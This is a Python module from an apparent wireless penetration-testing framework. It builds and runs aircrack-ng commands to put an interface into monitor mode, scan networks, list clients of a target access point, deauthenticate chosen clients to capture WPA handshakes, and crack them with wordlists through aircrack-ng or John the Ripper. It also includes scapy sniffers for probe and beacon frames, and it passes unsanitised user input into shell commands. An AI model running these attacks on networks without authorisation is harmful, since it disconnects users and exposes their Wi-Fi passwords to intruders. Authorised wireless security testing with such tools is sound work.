#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
#


import netifaces
import os
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
from scapy.all import sniff, Dot11, Dot11Elt
try:
    import core.core as core
    import core.commands as comm
    from core.colors import bc as bc
except:
    import sys
    sys.path.append('././')
    import core as core
    import commands as comm
    from core.colors import bc as bc


config = core.config()
logger = core.log()


AIRCRACKNG_SYM = (config['TOOLS']['AIRCRACKNG_SYM'])
AIRMONNG_SYM = (config['TOOLS']['AIRMONNG_SYM'])
AIRODUMPNG_SYM = (config['TOOLS']['AIRODUMPNG_SYM'])
AIREPLAYNG_SYM = (config['TOOLS']['AIREPLAYNG_SYM'])
JOHN_SYM = (config['TOOLS']['JOHN_SYM'])
# INTERFACE_NET = (config['NETWORK']['INTERFACE_NET'])


def checkDeviceMon(interface_mon):
    """Check if device is set in monitoring mode."""
    try:
        netifaces.ifaddresses(interface_mon)
        return interface_mon
        # print(bc.OKGREEN + '\t[+]  Interface found' + bc.ENDC)
    except:
        try:
            netifaces.ifaddresses((interface_mon + 'mon'))
            return (interface_mon + 'mon')
            # print(bc.OKGREEN + '\t[+]  Interface found' + bc.ENDC)
        except:
            deviceOK = 'n'
            print(bc.WARN + '\t[-]  Interface ' + interface_mon + ' NOT found!')
            while deviceOK == 'n':
                deviceName = input('\t     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'Specify the name, run (i)fconfig or (e)xit:' + bc.ENDC + ' ')
                if deviceName == 'e':
                    print(bc.FAIL + '\t[-]  Interface not found.' + bc.ENDC)
                    return None
                if deviceName == 'i':
                    print('')
                    os.system('ifconfig')
                    print('')
                if deviceName != 'i':
                    try:
                        deviceName = netifaces.ifaddresses(deviceName)
                        deviceOK = 'y'
                    except:
                        print(bc.WARN + '\t[-]  Interface ' + deviceName + ' NOT found!')
                        print(bc.FAIL + '\t[-]  If it\'s already in monitoring mode, then append \'mon\' to interfacename' + bc.ENDC)
    print(bc.OKGREEN + '\t[+]  Interface found.' + bc.ENDC)
    return deviceName


def setDeviceMon(interface_mon, channel):
    """Set device in monitoring mode. Optional: Specify channel."""
    if comm.checkInstalledS(AIRMONNG_SYM) != 'ERROR':
        command = (AIRMONNG_SYM + ' start ' + interface_mon)
        if channel:
            command += ' ' + channel
        logger.debug('Set device in monitoring mode with: ' + command)
        return command


def showWifis(interface_mon):
    """Return a command for scanning and show wifis."""
    if comm.checkInstalledS(AIRODUMPNG_SYM) != 'ERROR':
        command = (AIRODUMPNG_SYM + ' ' + interface_mon)
        logger.debug('Find wifis with: ' + command)
        return command


def showWifisF(interface_mon):
    """Scan and show wifis."""
    print('')
    comm.runCommand(showWifis(interface_mon), 'WIFIs')
    print('')


def showConnClients(interface_mon, bssid, channel, logfile):
    """Return a command for showing connected clients to a specified wifi."""
    if comm.checkInstalledS(AIRODUMPNG_SYM) != 'ERROR':
        if logfile:
            command = (AIRODUMPNG_SYM + ' ' + interface_mon + ' --bssid ' + bssid + ' --channel ' + channel + ' --write ' + logfile)
        else:
            command = (AIRODUMPNG_SYM + ' ' + interface_mon + ' --bssid ' + bssid + ' --channel ' + channel)
        logger.debug('Show clients connected to AP: ' + command)
        return command


def showConnClientsF(interface_mon):
    """Show connected clients to a specified wifi."""
    print('')
    print('\n\t[!]  Insert the BSSID and channel for target')
    i_bssid = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert BSSID:' + bc.ENDC + ' ')
    i_channel = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert channel:' + bc.ENDC + ' ')
    i_logfile = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'logfile:' + bc.ENDC + ' ')
    print('\t[*]  Starting xterm showing client\'s')
    print('\t[!]  Locate the BSSID for the client connected to the target accesspoint')
    print('\t[!]  Freeze the display in new xterm with "Ctrl+c"')
    comm.runCommand2(showConnClients(interface_mon, i_bssid, i_channel, i_logfile), 'Find_CLIENTS')
    print('')


def deauthClient(interface_mon, bssid, client, packages):
    """Return a command for deauthenticating clients from a AP."""
    if comm.checkInstalledS(AIREPLAYNG_SYM) != 'ERROR':
        command = (AIREPLAYNG_SYM + ' ' + interface_mon + ' -0 ' + packages + ' -a ' + bssid + ' -c ' + client)
        logger.debug('Deauth clients: ' + command)
        return command


def deauthClientF(interface_mon):
    """Deauthenticate clients from a AP."""
    print('\n\t[!]  Insert the BSSID and channel for target')
    i_bssid = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert BSSID:' + bc.ENDC + ' ')
    i_client = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert client STATION:' + bc.ENDC + ' ')
    print('\t[*]  Starting deauthing client')
    gotWPA = 'd'
    while gotWPA.lower() == 'd':
        os.system(deauthClient(interface_mon, i_bssid, i_client, '1'))
        print('\t[!]  Deauth with 1 package done. Got the handshake in the monitoring xterm?')
        gotWPA = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + '(d)eauth again or (e)nd:' + bc.ENDC + ' ')
    return None


def crackWPAa(passfile, cap_file):
    """Return a command for cracking WPA with Aircrack."""
    if comm.checkInstalledS(AIRCRACKNG_SYM) != 'ERROR':
        command = (AIRCRACKNG_SYM + ' -w ' + passfile + ' ' + cap_file)
        logger.debug('Crack with Aircrack: ' + command)
        return command


def crackWPAj(session_name, passfile, bssid, cap_file):
    """Return a command for cracking WPA with John the Ripper."""
    if comm.checkInstalledS(JOHN_SYM) != 'ERROR' and comm.checkInstalledS(AIRCRACKNG_SYM) != 'ERROR':
        command = (JOHN_SYM + ' --session=' + session_name + ' --wordlist=' + passfile + ' --stdout | ' + AIRCRACKNG_SYM + ' --bssid ' + bssid + ' -w - ' + cap_file)
        logger.debug('Crack with Aircrack and John: ' + command)
        return command


# Probes
def runProbes(interface_mon):
    """Get probe requests."""
    global listp
    listp = []
    sniff(iface=interface_mon, prn=probe)


def probe(pkt):
    """Subfunction from runProbes."""
    global listp
    if Dot11 in pkt and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 4:
        hwaddr = pkt[Dot11].addr2
        ssid_raw = pkt[Dot11Elt][0].info
        ssid = repr(ssid_raw).replace('b\'', '').strip('\'')
        if [hwaddr, ssid] not in listp:
            listp += [[hwaddr, ssid]]
            print('\t[+]  HWADDR: ' + str(hwaddr) + '  -  SSID: ' + str(ssid))


# Beacon
def runBeacons(interface_mon):
    """Get beacon requests."""
    global listb
    listb = []
    sniff(iface=interface_mon, prn=beacon)


def beacon(pkt):
    """Subfunction from runBeacons."""
    global listb
    if Dot11 in pkt and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 8:
        hwaddr = pkt[Dot11].addr2
        ssid_raw = pkt[Dot11Elt][0].info
        ssid = repr(ssid_raw).replace('b\'', '').strip('\'')
        if [hwaddr, ssid] not in listb:
            listb += [[hwaddr, ssid]]
            print('\t[+]  HWADDR: ' + str(hwaddr) + '  -  SSID: ' + str(ssid))


# Beacon and probes
def runBeaconNProbes(interface_mon):
    """Get beacon and probes requests."""
    global listbQ
    global listpQ
    listbQ = []
    listpQ = []
    sniff(iface=interface_mon, prn=beaconNprobe)


def beaconNprobe(pkt):
    """Subfunction from runBeaconNProbes."""
    global listbQ
    global listpQ
    if Dot11 in pkt and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 4:
        hwaddr = pkt[Dot11].addr2
        ssid_raw = pkt[Dot11Elt][0].info
        ssid = repr(ssid_raw).replace('b\'', '').strip('\'')
        if [hwaddr, ssid] not in listbQ:
            listbQ += [[hwaddr, ssid]]
            print('\t[+]  PROBE:   HWADDR: ' + str(hwaddr) + '  -  SSID: ' + str(ssid))
    if Dot11 in pkt and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 8:
        hwaddr = pkt[Dot11].addr2
        ssid_raw = pkt[Dot11Elt][0].info
        ssid = repr(ssid_raw).replace('b\'', '').strip('\'')
        if [hwaddr, ssid] not in listpQ:
            listpQ += [[hwaddr, ssid]]
            print('\t[+]  BEACON:  HWADDR: ' + str(hwaddr) + '  -  SSID: ' + str(ssid))
